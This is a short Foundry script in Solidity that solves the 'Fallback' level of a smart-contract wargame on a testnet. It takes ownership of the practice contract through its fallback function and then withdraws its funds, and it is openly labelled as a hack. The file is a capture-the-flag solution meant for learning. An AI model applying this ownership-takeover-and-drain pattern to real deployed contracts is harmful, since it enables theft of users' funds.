// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {Fallback} from "src/levels/Fallback.sol";

contract HackFallbackScript is Script {
    error FallbackScript_CallFailed();

    function run() external {
        // Get the Fallback contract address deployed on testnet
        address fallbackAddress = vm.envAddress("FALLBACK_ADDRESS");

        // Load the Fallback contract instance at the above address
        // Cast to payable address since the contract contains payable functions
        Fallback instance = Fallback(payable(fallbackAddress));

        // Get private key from .env file
        uint256 deployerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");

        // Set attacker as the msg.sender for all subsequent transactions.
        vm.startBroadcast(deployerKey);

        instance.contribute{value: 1 wei}();
        (bool success, ) = payable(instance).call{value: 1 wei}("");
        if (!success) revert FallbackScript_CallFailed();
        instance.withdraw();

        vm.stopBroadcast();
        console2.log("SUCCESS!!! Submit the instance.");
    }
}
